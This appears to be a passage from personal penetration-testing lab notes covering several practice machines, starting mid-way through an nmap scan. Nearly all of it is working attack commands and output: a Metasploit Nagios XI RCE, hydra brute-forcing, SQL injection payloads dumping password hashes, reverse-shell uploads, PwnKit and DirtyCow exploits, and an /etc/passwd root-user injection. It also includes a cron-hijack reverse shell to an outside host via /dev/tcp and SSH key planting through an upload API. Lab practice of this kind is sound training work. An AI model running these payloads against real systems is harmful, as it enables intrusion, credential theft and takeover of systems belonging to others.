|   256 e7:bb:11:c1:2e:cd:39:91:68:4e:aa:01:f6:de:e6:19 (ECDSA)
|_  256 0f:8e:28:a7:b7:1d:60:bf:a6:2b:dd:a3:6d:d1:4e:a4 (ED25519)
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-09-08T17:59:00
|_Not valid after:  2030-09-06T17:59:00
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.18 (Ubuntu)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Nagios XI
| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2020-09-08T18:28:08
|_Not valid after:  2030-09-06T18:28:08
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
5667/tcp open  tcpwrapped
Service Info: Host:  ubuntu; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.66 seconds
```

2. Directorysearch - Found login page. 
```
feroxbuster -u http://192.168.176.236/ 

http://192.168.176.136/nagiosxi/login.php
```

3. Found metasploit exploit. Found proof.txt
```
msf6 exploit(linux/http/nagios_xi_authenticated_rce) > set password admin
password => admin
msf6 exploit(linux/http/nagios_xi_authenticated_rce) > set username admin
username => admin
msf6 exploit(linux/http/nagios_xi_authenticated_rce) > run

meterpreter > shell
Process 11125 created.
Channel 1 created.
whoami
root
ls 
CHANGES.txt
getprofile.sh
profile.inc.php
profile.php
cd /root
ls
proof.txt
scripts
cat proof.txt
37a0a7436011be3a6dee351a94b04c95

```


## InsanityHosting

1. Rustscan and Nmap
```
rustscan 192.168.176.124 
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

nmap -p$(cat insanityhosting-open-ports.txt | cut\n' ',') -T4 -A 192.168.176.124
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02
Nmap scan report for 192.168.176.124
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.242
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230
|_Can't get directory listing: ERROR
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 85:46:41:06:da:83:04:01:b0:e4:1f:9b:7e:8b:31
|   256 e4:9c:b1:f2:44:f1:f0:4b:c3:80:93:a9:5d:96:98:
|_  256 65:cf:b4:af:ad:86:56:ef:ae:8b:bf:f2:f0:d9:be:
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Insanity - UK and European Servers
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.2.3
Service Info: OS: Unix

Service detection performed. Please report any incorrps://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.59 
```

2. Found four login page from directory search. 
```
phpmyadmin
monitoring
webmail
news
```

4. On subdirectory new, user Otis was found and perfomed bruteforce and figured out his credentials. 
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ hydra -l Otis -P /usr/share/wordlists/rockyou.txt 192.168.176.124 http-post-form "/webmail/src/redirect.php:login_username=Otis&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:SquirrelMail - Unknown user or password incorrect."

[80][http-post-form] host: 192.168.176.124   login: Otis   password: 123456
```

5. Performed sql injection in webmails using monitoring subdirectory. 
```
1. Add new rule at monitoring subdirectory. 
Name: admin" UNION SELECT 1, user, password, authentication_string FROM mysql.user -- -
Ip: 192.168.255.255

2. Obtained new warning message on webmail portal. 


admin" UNION SELECT 1, user, password, authentication_string FROM mysql.user -- - is
down. Please check the report below for more information.

ID, Host, Date Time, Status
1,root,*CDA244FF510B063DA17DFF84FF39BA0849F7920F,
1,,,
1,elliot,,*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9
```

6. Checked out elliot hash online and found its cracking password elliot123. 

7. SSH login and found local.txt. 
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ ssh elliot@192.168.157.124 

[elliot@insanityhosting ~]$ cat local.txt
dedb68b4890aed1c1717902bb488ad0d
```

8. Ran linpeas and found out pwnkit vulnerability. Obtaine proof.txt
```
[elliot@insanityhosting ~]$ ./PwnKit
[root@insanityhosting elliot]# whoami
root
[root@insanityhosting ~]# cat proof.txt
26f277e75dc66094a50901376c2d3fa5
```


## DriftingBlue6
1. Rustscan and nmap
```
rustscan 192.168.157.219

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

nmap -A -T4 -p 80 192.168.157.219
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-23 19:45 EST
Nmap scan report for 192.168.157.219
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/textpattern/textpattern
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: driftingblues

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.69 seconds
```

2. Dir-brute - find out robots.txt giving hints to look for zip file. 
```
gobuster dir -u http://192.168.157.219 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.157.219
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 750]
/db                   (Status: 200) [Size: 53656]
/robots               (Status: 200) [Size: 110]
/spammer              (Status: 200) [Size: 179]
/spammer.zip          (Status: 200) [Size: 179]
Progress: 34251 / 441122 (7.76%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 34252 / 441122 (7.76%)
===============================================================
Finished
===============================================================
```

3. Download spammer.zip and crack it. 
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ zip2john spammer.zip > spammer_hash
ver 2.0 spammer.zip/creds.txt PKZIP Encr: cmplen=27, decmplen=15, crc=B003611D ts=ADCB cs=b003 type=0
                                                                           
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ john -w=/usr/share/wordlists/rockyou.txt spammer_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
myspace4         (spammer.zip/creds.txt)     
1g 0:00:00:00 DONE (2024-02-23 20:34) 100.0g/s 2457Kp/s 2457Kc/s 2457KC/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

4. Login with obtained credentials and upload moneky pentest reverse shell. 
```
cat creds.txt                        
mayer:lionheart  

http://192.168.157.219/textpattern/textpattern/index.php?event=file

http://192.168.157.219/textpattern/files/

┌──(kali㉿kali)-[~/OSCP/pg]
└─$ sudo nc -nvlp 1234               
listening on [any] 1234 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.157.219] 52821
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
 19:51:17 up  2:32,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

5. Run linpeas and figured out that it's vulnerable with kernel exploit. 40616.c #dirtycow
```
www-data@driftingblues:/tmp$ gcc 40616.c -o cow -pthread

www-data@driftingblues:/tmp$ ./cow

firefart@driftingblues:/tmp# cd /root
firefart@driftingblues:/root# ls
proof.txt
firefart@driftingblues:/root# cat proof.txt
5e9e8a3ef8cb2a14b4803ed41a5f3539
```

## Blogger 
1. Rustscan and nmap

2. Figure out web page at wordpress page at /assets/fonts/blog

3. Figured out that gif file is allowed to post in comment section so, added GIF89a; infront of reverse shell (monkey pentest) and upload. 

4. Obtained reverse shell and local.txt. 

5. Figured out its vulnerale with pwnkit from linpeas so, get it from local machine and exploit and get root and proof.txt. 

## DC - 9

1. Rustscan and Nmap
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ rustscan 192.168.157.209


PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack


Also find out later that port 25 was open. 
```

2. Figure out SQL vulnerability. 
a. Manual Exploitation
```
mary' union select group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema=database() # 

ID: 1
Name: Mary Moe
Position: CEO
Phone No: 46478415155456
Email: marym@example.com

ID: StaffDetails,Users
Name: 2 3
Position: 4
Phone No: 5
Email: 6


mary' union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name='Users' #


 ID: 1
Name: Mary Moe
Position: CEO
Phone No: 46478415155456
Email: marym@example.com

ID: UserID,Username,Password
Name: 2 3
Position: 4
Phone No: 5
Email: 6


' UNION SELECT UserID,2,3,Username,Password,6 FROM Users -- '

ID: 1
Name: 2 3
Position: admin
Phone No: 856f5de590ef37314e7c3bdf6f8a66dc
Email: 6
```

b. Exploitation of obtained hash
```
856f5de590ef37314e7c3bdf6f8a66dc - transorbital1 - Possible algorithms: MD5
```

c. SQLMAP automation exploit
```
cat req   
POST /results.php HTTP/1.1
Host: 192.168.175.209
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://192.168.175.209
Connection: close
Referer: http://192.168.175.209/search.php
Cookie: PHPSESSID=nlskac2ca73es1b8c364gafh7d
Upgrade-Insecure-Requests: 1

search=fuzz

┌──(kali㉿kali)-[~/OSCP/pg]
└─$ sqlmap -r req --dump --batch --dbms=mysql --dbs -D users
```

4. Found users and passwords. 

5. Performed hydra attacks and find out three pairs. 
```
──(kali㉿kali)-[~/OSCP/pg]
└─$ hydra -L user.txt -P pass.txt ssh://Example.com

[22][ssh] host: 192.168.1.79 login: chandlerb password: UrAG0D!  
[22][ssh] host: 192.168.1.79 login: joeyt password: Passw0rd  
[22][ssh] host: 192.168.1.79 login: janitor password: Ilovepeepee
```

6. Ssh login as janitor and found more passwords. 
```
janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
```

7. Used obtained credentails fir another hydra attack. Find another pair. 
```
fredf:B4-Tru3-001
```

8. Get test as sudo privileges for fred, check out file. 
```
fredf@dc-9:/opt/devstuff/dist/test$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test

fredf@dc-9:/opt/devstuff$ cat test.py
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```

9. Create new root user and find proof. 
```
fredf@dc-9:~$ openssl passwd 1234
HbuQZGW3cm48o
fredf@dc-9:~$ echo "root2:HbuQZGW3cm48o:0:0:root:/root:/bin/bash" > pass.txt
fredf@dc-9:~$ sudo  /opt/devstuff/dist/test/test pass.txt 
Usage: python test.py read append
fredf@dc-9:~$ sudo /opt/devstuff/dist/test pass.txt 
[sudo] password for fredf: 
sudo: /opt/devstuff/dist/test: command not found
fredf@dc-9:~$ echo "root2:HbuQZGW3cm48o:0:0:root:/root:/bin/bash" > pass.txt
fredf@dc-9:~$ sudo  /opt/devstuff/dist/test/test pass.txt /etc/passwd
fredf@dc-9:~$ su root2
Password: 
root@dc-9:/home/fredf# whoami
root
```

## Amaterasu 

1. Rustscan and nmap
```
rustscan 192.168.175.249

PORT      STATE SERVICE REASON
21/tcp    open  ftp     syn-ack
25022/tcp open  unknown syn-ack
33414/tcp open  unknown syn-ack
40080/tcp open  unknown syn-ack

nmap -p$(cat amaterasu-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.175.249
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-24 06:36 EST
Nmap scan report for 192.168.175.249
Host is up (0.30s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.185
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
25022/tcp open  ssh     OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
33414/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.3 Python/3.9.13
|     Date: Sat, 24 Feb 2024 11:36:42 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   HTTPOptions: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.3 Python/3.9.13
|     Date: Sat, 24 Feb 2024 11:36:43 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   Help: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
40080/tcp open  http    Apache httpd 2.4.53 ((Fedora))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.53 (Fedora)
|_http-title: My test page
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33414-TCP:V=7.94SVN%I=7%D=2/24%Time=65D9D4CA%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkze
SF:ug/2\.2\.3\x20Python/3\.9\.13\r\nDate:\x20Sat,\x2024\x20Feb\x202024\x20
SF:11:36:42\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCont
SF:ent-Length:\x20207\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<
SF:html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found<
SF:/h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x2
SF:0server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x
SF:20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n")%r(HTTPOpti
SF:ons,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkzeug/2\.2\.
SF:3\x20Python/3\.9\.13\r\nDate:\x20Sat,\x2024\x20Feb\x202024\x2011:36:43\
SF:x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Lengt
SF:h:\x20207\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20l
SF:ang=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\n<p>
SF:The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server\.
SF:\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20check\x
SF:20your\x20spelling\x20and\x20try\x20again\.</p>\n")%r(RTSPRequest,1F4,"
SF:<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dt
SF:d\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;charset=utf-
SF:8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\
SF:n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Messag
SF:e:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_
SF:REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method
SF:\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(Help,1EF,"<!DOCTYPE\x20H
SF:TML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n
SF:\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-e
SF:quiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\
SF:x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1
SF:>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20co
SF:de:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20r
SF:equest\x20syntax\x20\('HELP'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\
SF:x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20
SF:\x20</body>\n</html>\n");
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.81 seconds
```

2. Dir-brute
```
feroxbuster -u http://192.168.175.249:33414/

http://192.168.175.249:33414/help

# http://192.168.175.249:33414/help
"GET /info : General Info"
"GET /help : This listing"
"GET /file-list?dir=/tmp : List of the files"
"POST /file-upload : Upload files"

# http://192.168.175.249:33414/file-list?dir=/home/alfredo/
0	".bash_logout"
1	".bash_profile"
2	".bashrc"
3	"local.txt"
4	".ssh"
5	"restapi"
6	".bash_history"
```

3. Uploaded new ssh keys
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ curl -i -L -X POST -H "Content-Type: multipart/form-data" -F file="@/home/kali/OSCP/pg/sam.txt" -F filename="/home/alfredo/.ssh/authorized_keys" http://192.168.175.249:33414/file-upload
HTTP/1.1 201 CREATED
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Sat, 24 Feb 2024 12:59:18 GMT
Content-Type: application/json
Content-Length: 41
Connection: close

{"message":"File successfully uploaded"}
```

4. New ssh login. Found local.txt
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ ssh alfredo@192.168.175.249 -p 25022 -i /home/kali/OSCP/pg/sam 
Enter passphrase for key '/home/kali/OSCP/pg/sam': 

[alfredo@fedora ~]$ cat local.txt 
3e8512ea09b6f3a005bb5e6c490c057b
```

5. Found cronjob, exploit and found proof.txt
```
[alfredo@fedora tmp]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

*/1 * * * * root /usr/local/bin/backup-flask.sh



[alfredo@fedora restapi]$ echo 'bash -i >& /dev/tcp/192.168.45.185/4447 0>&1'>>tar
[alfredo@fedora restapi]$ chmod 777 tar



[alfredo@fedora restapi]$ cat tar
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.185/4447 0>&1
chmod u+s /usr/bin/find

[alfredo@fedora restapi]$ find . -exec /bin/sh -p \; -quit
sh-5.1# id
uid=1000(alfredo) gid=1000(alfredo) euid=0(root) groups=1000(alfredo)
sh-5.1# cd /root
sh-5.1# ls
anaconda-ks.cfg  build.sh  proof.txt  run.sh
sh-5.1# cat proof.txt 
463f8f34a2898888a441146f17a163fb
```